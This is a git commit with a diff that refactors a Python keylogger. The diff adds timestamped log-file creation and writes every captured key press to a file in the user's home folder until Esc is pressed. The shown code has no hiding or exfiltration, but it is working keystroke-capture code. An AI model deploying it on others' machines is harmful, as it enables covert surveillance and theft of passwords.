21d0638246b9407d02d75efb8d0f8b0f615af255
Preetham Ananthkumar <preetham.mervin@gmail.com>
2023-09-18 11:23:04 +0100

    Refactored code into functions and added log file rotation

--- keylogger.py
+++ keylogger.py
@@ -7,20 +7,28 @@ log_folder = os.path.join(os.path.expanduser("~"), "keylogs")
 os.makedirs(log_folder, exist_ok=True)
 
 # Generate a timestamp for the log file
-timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
+def get_timestamp():
+ return time.strftime("%Y-%m-%d_%H-%M-%S")
+
+# Define a function to create a new log_file
+def create_new_log_file():
+    timestamp = get_timestamp()
+    log_filename = os.path.join(log_folder, f"keylog_{timestamp}.txt")
+    return log_filename
 
 # Define a function to write the key presses to a log file.
-def write_to_log(key):
-    log_filename = os.path.join(log_folder, f"keylog_{timestamp}.txt")
-    with open(log_filename, "a") as log_file:
-        log_file.write(str(key) + "\n")
-
+def write_to_log(log_file, key):
+    log_file.write(str(key) + "\n")
+    log_file.flush()
+    
 # Define a function that listens for key presses and writes them to the log file.
 def on_key_press(key):
     if key == Key.esc:
         # Stop keylogger
         return False
-    write_to_log(key)
+    write_to_log(current_log_file, key)
+
+current_log_file = open(create_new_log_file(), "a")    
 
 # Set up the keylogger
 with Listener(on_press=on_key_press) as listener:
